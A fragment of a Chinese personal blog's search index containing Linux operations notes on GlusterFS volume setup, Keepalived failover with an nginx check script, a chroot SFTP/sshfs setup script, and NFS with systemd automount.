","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:1:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"2. 安装 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:2:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"2.1. 基础环境配置 关闭防火墙 关闭selinux 统一主机名称(保证唯一主机名) 添加hosts解析 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:3:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"2.2. 安装 每个节点机器均需要安装并启动： [root@node11 ~]# yum install epel-release # epel 源 [root@node11 ~]# yum install centos-release-gluster40 # 安装gluster 源 [root@node11 ~]# yum install glusterfs-server glusterfs-geo-replication #安装gluster [root@node11 ~]# glusterfs -V # 查看版本信息 glusterfs 4.1.6 Repository revision: git://git.gluster.org/glusterfs.git Copyright (c) 2006-2016 Red Hat, Inc. \u003chttps://www.gluster.org/\u003e GlusterFS comes with ABSOLUTELY NO WARRANTY. It is licensed to you under your choice of the GNU Lesser General Public License, version 3 or any later version (LGPLv3 or later), or the GNU General Public License, version 2 (GPLv2), in all cases as published by the Free Software Foundation. [root@node11 ~]# systemctl start glusterd # 启动 [root@node11 ~]# systemctl enable glusterd # 加入开机启动项 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:4:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3. 配置 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:5:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.1. 将存储主机加入存储信任池 # 将存储主机加入存储信任池，任意一个节点添加非当前节点的节点即可 # 如：node11,node12,node13(主机别名) ,在node11 添加 node12,node13。或在node12 添加 node11,node13 ... [root@node11 ~]# gluster peer probe node12 peer probe: success. ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:6:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.2. 查看状态 [root@node11 ~]# gluster peer status Number of Peers: 1 Hostname: node12 Uuid: 1bf6ec90-7130-48db-86e8-acb38abc6b40 State: Peer in Cluster (Connected) ############ [root@node12 ~]# gluster peer status Number of Peers: 1 Hostname: node11 Uuid: 4f2833b8-a117-4540-8e29-691a6849737e State: Peer in Cluster (Connected) ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:7:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.3. 创建volume 卷 创建volume 及其他操作 分布卷(Distributed)： 文件通过hash算法随机的分布到有bricks组成的卷上,是文件分散存储 复制卷(Replicated) : 类似raid1, replica 数必须登录volume中birck所包含的存储服务器数，可高可用 条带卷(Striped) : 类似raid0，stripe数必须等于volume中brick所包含的存储服务器数，文件被分成数据块，以round robin的方式存储在bricks中，并发粒度是数据块，大文件性能好。 分布式卷、分布式复制卷(主要使用)、分布式条带卷(不建议使用)即组合 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:8:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.3.1. 分布式挂载卷 类似raid0,但是是文件分散存储，而不是文件被拆分为块分散存储 3.3.1.1. 创建 # 创建挂载目录(这个目录就是数据盘的挂载目录,我但服务器总共挂载了6块盘，用来测试) [root@node11 ~]# mkdir -p /data/node1{1..3} /data/node{1..3}1 ## store: 相当于逻辑卷的那个别名 ## node11、node12 就是主机名称,也可以是ip ## /data/node1 是挂载的目录，应该是相当于nfs远程挂载的本地路径(此处指的是存储磁盘，建议每个节点服务器的存储名称一致，方便区分) [root@node11 ~]# gluster volume create store1 node11:/data/node1 node12:/data/node1 force # 创建分布卷 volume create: store1: success: please start the volume to access data 3.3.1.2. 启动 [root@node11 ~]# gluster volume start store1 # 启动卷 volume start: store1: success 3.3.1.3. 查看 [root@node11 ~]# gluster volume info store1 # 查看卷(node1) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### [root@node12 ~]# gluster volume info store1 # 查看卷(node2) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### 3.3.1.4. 挂载 /etc/fstab: localhost:/store1 /mnt glusterfs defaults,_netdev 0 0 # 以glusterfs的形式挂载(node1可以是任意一个节点的名称或ip，另外还有一种是nfs形式挂载，但该方法挂载未测试成功过， # 此处就不说明了，如果有遇到过同样问题并解决了，欢迎指出) [root@node1 ~]# mount -t glusterfs node1:/store1 /mnt [root@node1 ~]# df -h # 我是一个200g的盘，一个20G的盘，合并卷后可以看到总共220G，因为我是两个盘下面的一个目录来做的实验，所有存在较大的使用空间(实际空盘创建后只会有卷的缓存目录存在,大概几十M左右) Filesystem Size Used Avail Use% Mounted on ## 省略 ## node1:/store 218G 11G 207G 6% /mnt # 在挂载目录下创建多个(如：100个)测试文件，那么/mnt(即挂载目录)文件总个数100，实际node1的/data/node1目录90个，node2的/data/node1目录10个， # 他是通过hash算法分配文件存放位置的，以上仅是我个人的测试数据结果 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:8:1","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.3.2. 分布式复制卷 近似raid1： 3.3.2.1. 创建 [root@node1 ~]# mkdir /data/node2 # 和分布卷描述一样，假装他是一个独立的盘，用来测试的 # replica 2: 代表复制卷的个数，这个值需要和后面node节点配置的节点个数一致 [root@node1 ~]# gluster volume create store2 replica 2 node1:/data/node2 node2:/data/node2 force volume create: store2: success: please start the volume to access data 3.3.2.2. 启动 [root@node1 ~]# gluster volume start store2 # 启动卷 volume start: store2: success 3.3.2.3. 查看 [root@node1 ~]# gluster volume info store2 # 查看卷 Volume Name: store2 Type: Replicate Volume ID: 771df90e-4745-46c0-b763-1e155b163db0 Status: Started Snapshot Count: 0 Number of Bricks: 1 x 2 = 2 Transport-type: tcp Bricks: Brick1: node1:/data/node2 Brick2: node2:/data/node2 Options Reconfigured: transport.address-family: inet nfs.disable: on performance.client-io-threads: off #################################################### [root@node2 ~]# gluster volume info store2 # 查看卷 Volume Name: store2 Type: Replicate Volume ID: 771df90e-4745-46c0-b763-1e155b163db0 Status: Started Snapshot Count: 0 Number of Bricks: 1 x 2 = 2 Transport-type: tcp Bricks: Brick1: zabbix02:/data/node2 Brick2: monitor:/data/node2 Options Reconfigured: transport.address-family: inet nfs.disable: on performance.client-io-threads: off #################################################### 3.3.2.4. 挂载 # 描述同分布式挂载一样 [root@node1 ~]# mount -t glusterfs node1:/store2 /mnt [root@node1 ~]# df -h # 同上 我一个是 200G的盘，一个为20G的盘，但分布式复制卷和raid1一样，都是以最小盘空间为最大空间，所以合并后是最小的盘的空间 # 因为我是两个盘下面的一个目录来做的实验，所有存在较大使用空间(实际空盘创建后只会存在几十M的卷的缓存占用) Filesystem Size Used Avail Use% Mounted on ## 省略 ## node1:/store2 18G 8.9G 8.7G 51% /mnt # 由于是复制卷，因此同上分部卷的测试，结果为 挂载mnt目录中文件个数100,实际node1的/data/node3目录文件个数100,实际node2的/data/node3目录文件个数100 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:8:2","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"3.3.3. 分布式条带卷 3.3.3.1. 创建 近似read0 : [root@node1 ~]# mkdir /data/node3 # 和分布卷描述一样，假装他是一个独立的盘，用来测试的 [root@node1 ~]# gluster volume create store3 stripe 2 node1:/data/node3 node2:/data/node3 force volume create: store3: success: please start the volume to access data 3.3.3.2. 启动 [root@node1 ~]# gluster volume start store3 # 启动卷 volume start: store3: success 3.3.3.3. 查看 [root@node1 ~]# gluster volume info store3 # 查看卷 Volume Name: store3 Type: Stripe Volume ID: a0f49a74-2e89-4d06-bbdb-195032908a7e Status: Started Snapshot Count: 0 Number of Bricks: 1 x 2 = 2 Transport-type: tcp Bricks: Brick1: node1:/data/node4 Brick2: node2:/data/node4 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### [root@node2 ~]# gluster volume info store3 # 查看卷 Volume Name: store3 Type: Stripe Volume ID: a0f49a74-2e89-4d06-bbdb-195032908a7e Status: Started Snapshot Count: 0 Number of Bricks: 1 x 2 = 2 Transport-type: tcp Bricks: Brick1: node1:/data/node4 Brick2: node2:/data/node4 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### 3.3.3.4. 挂载 [root@node1 ~]# mount -t glusterfs node1:/store3 /mnt [root@node1 ~]# df -h # 同上 我一个是 200G的盘，一个为20G的盘，由于类似raid0，合并后不存在空间变化，所以总共220G # 因为我是两个盘下面的一个目录来做的实验，所有存在较大的使用空间(实际空盘创建后占用只有几十M的缓存) Filesystem Size Used Avail Use% Mounted on ## 省略 ## 127.0.0.1:/store3 218G 11G 207G 6% /mnt # 数据测试：用dd写入(dd if=/dev/zero bs=1M count=5 of=/mnt/5M.file)一个5M大小的文件到挂载目录，结果挂载目录文件占用大小5M， # 实际node1 目录文件大小2.5M占用, 实际node2 目录文件大小2.5M占用 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:8:3","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"4. 优化 ","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:9:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"Keepalive安装配置","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"安装前需检查反项代理是否正常 yum install keepalived ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"配置文件说明 /etc/keepalived/keepalived.conf 主备节点配置基本一致,需修改的仅有 router_id , state ，priority # GLOBAL CONFIGURATION # 全局配置 仅保留router_id 即可, router_id 为高可用集群成员ID,ID 唯一 # VRRPD CONFIGURATION # vrrpd 配置 vrrp_instance VI_1 { # 定义实例信息，同主备节点实例标识相同(唯一) state MASTER # 定义实例中主备状态角色(MASTER/BACKUP),仅为标识而已 interface eth1 # 设置主备服务器虚拟ip放置网卡位置 virtual_router_id 51 # 虚拟路由ID标识，不同实例不同，各个主备节点相同(0-255) priority 100 # 设置抢占优先级，数值越大越优先(1-254) advert_int 1 # 主备通讯时间间隔(s) authentication { # 主备间通过认证建立连接 auth_type PASS auth_pass 1111 } virtual_ipaddress { # 定义主备服务器之间使用的虚拟IP地址信息(VIP)，一般来说一个实例对应一个服务，一个服务监听配置的固定VIP 192.16.10.5/24 dev eth1 label eth1:1 } } # LVS CONFIGURATION # 相当于nginx的部分 ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:1:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"脑裂：只要备服务器收不到主的组播包，备就会成为主,而主资源未释放 ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"原因 防火墙 多节点间的网络出现故障 virtual_router_id 配置数值不正确 ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:1","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"解决方案 一般来说,只要备节点出现VIP就表示不正常，但也有可能是正常的主备切换，如果不是正常的切换， 那么可能是当前节点故障或者当前节点与主节点的通信问题，可以建立一个脚本周期性检查当前节点 与网关的连接性，不通，则应该是自身问题(写个循环ping网关，不通关闭keepalive，通过打开keepalive) ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:2:2","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"建立nginx与keepalived的关联 nginx 存活检测(示例，实际可能需要更为详细的检测脚本) ，完成后需要修正keepalive.service在nginx.service后启动 #!/bin/bash systemctl is-active nginx.service \u003e\u0026 /dev/null || { systemctl stop keepalived.service } ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:3:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"修改配置 /etc/keepalived/keepalived.conf vrrp_script check_web { # 函数名(需放到实例与全局之间) script \"/opt/sh/check_nginx_status.sh\" # 监控脚本(需有执行权限) interval 2 # 检查时间间隔(s) # weight 2 # 用于与执行结果判断而调整优先级的 } track_script { # 调用配置的函数脚本（放到实例配置里面） check_web } ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:3:1","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"双主(或互为主备) 实现就是在两个节点中在添加一个实例，修改state，priority，和VIP ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:4:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Chroot系统,用于限制sftp的根目录权限","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"以下是一片草稿，真的真的是我自己记录的。但是！我现在自己也看不懂了，我真是栓Q了，好像多了一个chroot初始没啥用 ","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"chroot系统 正常来说针对于文件共享的sftp应该是以用户为单位来做的,但这儿我却用的是组,这个其实是我测试用用户来做从来没有成功过，只能被迫用组 #!/bin/bash ################################################# # author 0x5c0f # date 2020-12-04 # email mail@0x5c0f.cc # web blog.0x5c0f.cc # version 1.0.0 # last update 2021-04-21 # descript Use : ./chroot.init.sh ################################################# PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # 用于在linux之间替代nfs系统 # chroot 系统根目录 CHROOTHOME=\"/chroot_sftp\" # sshfs # 用户配置 SSHFSUID=\"1050\" SSHFSUSER=\"sshfs\" SSHFSROOT=\"/home/${SSHFSUSER}\" # sshfs chroot 映射目录 SSHFSCHROOTDIR=\"${CHROOTHOME}/sshfsdir\" # sshfs 本地共享目录 SSHFSLOCALSHARE=\"/mnt/sshfsdir\" function init_chroot(){ test ! -d ${CHROOTHOME} \u0026\u0026 { mkdir -p ${CHROOTHOME}/{bin,usr,etc,lib64,home,dev,data} mknod -m 666 ${CHROOTHOME}/dev/null c 1 3 mknod -m 666 ${CHROOTHOME}/dev/tty c 5 0 mknod -m 666 ${CHROOTHOME}/dev/zero c 1 5 mknod -m 666 ${CHROOTHOME}/dev/random c 1 8 chmod o+t ${CHROOTHOME}/dev/null ${CHROOTHOME}/dev/tty ${CHROOTHOME}/dev/zero ${CHROOTHOME}/dev/random cd ${CHROOTHOME}/usr ln -sf ../bin ./bin ln -sf ../lib64 ./lib64 cp -p /bin/ls /bin/cat /bin/rm /bin/echo /bin/false /bin/touch /bin/vi /bin/mkdir ${CHROOTHOME}/bin/ for i in /bin/{ls,cat,echo,rm,false,touch,vi,mkdir}; do list=$(ldd ${i} | egrep -o '/lib.*\\.[0-9]') for _so in $list; do /bin/cp -v ${_so} ${CHROOTHOME}${_so} done done } } function config_sshd(){ cat \u003e\u003e /etc/ssh/sshd_config \u003c\u003cEOE Match $1 $2 ChrootDirectory $3 ForceCommand internal-sftp -l INFO -f AUTH X11Forwarding no AllowTcpForwarding no PasswordAuthentication no EOE systemctl restart sshd } # 配置systemd管理模块 # $0 文件名 绑定目录 绑定目标目录 是否只读(默认为空: 读写) # mount -o bind${4:+,ro} 绑定目录 绑定目标目录 function config_systemd(){ cat \u003e /etc/systemd/system/$1 \u003c\u003cEOF # Automatically generated by systemd-fstab-generator [Unit] SourcePath=/etc/fstab Documentation=man:fstab(5) man:systemd-fstab-generator(8) Before=local-fs.target [Mount] What=${2} Where=${3} Type=none Options=defaults,bind${4:+,ro} [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now $1 } # 初始化sftp可用组 function init_sshfs(){ # 初始sshd配置 config_sshd \"User\" $SSHFSUSER $SSHFSCHROOTDIR # 创建sshfs共享用户 useradd -u ${SSHFSUID} -m -k $(mktemp -d) -d ${SSHFSROOT} -s /bin/false ${SSHFSUSER} # 创建远程登陆密钥 su - ${SSHFSUSER} -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" su - ${SSHFSUSER} -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" # 创建chroot sshfs共享目录 mkdir -p ${CHROOTHOME}${SSHFSROOT} # 绑定目录主目录 # mount -o ro,bind ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} # fstab # cat \u003e\u003e /etc/fstab \u003c\u003cEOF # ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} none defaults,ro,bind 0 0 # EOF SYSTEMDFNAME=\"${CHROOTHOME#/}${SSHFSROOT//\\//-}.mount\" # 配置用户帐号映射 config_systemd \"${SYSTEMDFNAME}\" \"${SSHFSROOT}\" \"${CHROOTHOME}${SSHFSROOT}\" 1 # 配置sshfs目录映射 test ! -d ${SSHFSCHROOTDIR} \u0026\u0026 { mkdir -p $SSHFSCHROOTDIR } test ! -d $SSHFSLOCALSHARE \u0026\u0026 { mkdir -p $SSHFSLOCALSHARE } echo \"sshfs 共享目录 \" \u003e $SSHFSLOCALSHARE/readme.md TSSHFSCHROOTDIR=${SSHFSCHROOTDIR#/} config_systemd \"${TSSHFSCHROOTDIR//\\//-}.mount\" \"${SSHFSLOCALSHARE}\" \"${SSHFSCHROOTDIR}\" # cat ${SSHFSROOT}/.ssh/id_rsa } init_chroot # sshfs init_sshfs ","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/:1:0","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"节点服务器配置 # 开机启动项 $\u003e vim /etc/fstab sshfsdir@10.0.2.30:/node21 /data/backup fuse.sshfs auto,reconnect,_netdev,user,idmap=user,identityfile=/etc/.ssh/sshfsdir,allow_other,default_permissions,uid=1002,gid=1002 0 0 # zabbix 监控 $\u003e vim /opt/zabbix-agentd/etc/zabbix_agentd.conf.d/sshfs_status.conf UserParameter=sshfs_status,/bin/systemctl is-active data-ltbstore.mount \u003e\u0026 /dev/null \u0026\u0026 echo 0 || echo 1 ","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/:2:0","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","那些有用没用的"],"content":"NFS部署及autofs替代方案systemd","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"nfs 服务 ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:1:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"部署 $\u003e yum install nfs-utils rpcbind \u0026\u0026 mkdir /nfsshare \u0026\u0026 chown nfsnobody. nfsshare ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:2:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"配置文件说明 /etc/exports 用于管理贡献相关配置的文件 内容格式: NFS共享目录 NFS客户端地址(参数1、参数2…) 客户点地址2（参数1、参数2…）{示例: / master(rw) master2(insecure,rw,all_squash)} NFS贡献目录: NFS实际需要贡献出去的目录 客户端地址: 客户端可以访问贡献目录的地址，可以为主机名、ip地址(网段)、通配符(*) 参数 作用 ro 只读 rw 读写 root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的匿名用户 no_root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的root管理员 all_squash 无论NFS客户端使用什么账户访问，均映射为NFS服务器的匿名用户 sync 同时将数据写入到内存与硬盘中，保证不丢失数据 async 优先将数据保存到内存，然后再写入硬盘；这样效率更高，但可能会丢失数据 insecure 是客户端从大于1024的端口发送链接 ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:3:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"启动和检查本地共享情况 $\u003e systemctl restart nfs $\u003e showmount -e 127.0.0.1 Export list for 127.0.0.1: /nfsshare * $\u003e cat /var/lib/nfs/etab /nfsshare *(rw,sync,wdelay,hide,nocrossmnt,insecure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,rw,insecure,root_squash,no_all_squash) ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:4:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"nfs挂载 $\u003e mount.nfs 127.0.0.1:/nfsshare /mnt # 127.0.0.1:/nfshare /mnt nfs defaults 0 0 \u003e\u003e /etc/fstab ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:5:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"autofs 自动挂载 使用systemd automount替代 # 创建systemd mount和automount节点，文件名命名规范:挂载到/mnt/other下,名字则必须为: mnt-other.mount 和 mnt-other.automount $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Mount] Where=/mnt/other # 本地挂载目录 What=192.16.10.200:/nfsshare # (远程)挂载点 Type=nfs # 挂载系统类型 Options=defaults # 挂载参数 $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Automount] Where=/mnt/other # 本地挂载目录，同步mount单元的目录 TimeoutIdleSec=12 # 超时时间，多少秒未操作自动卸载挂载点 [Install] WantedBy=multi-user.target # 创建完成后重载配置 $\u003e systemctl daemon-reload # 激活 automount 并加入开机启动项 $\u003e systemctl enable --now mnt-other.automount # 另：automount 在centos 7下可通过fstab配置默认参数noauto,x-systemd.automount 自动创建(systemctl daemon-reload),创建于/run/systemd/generator/下 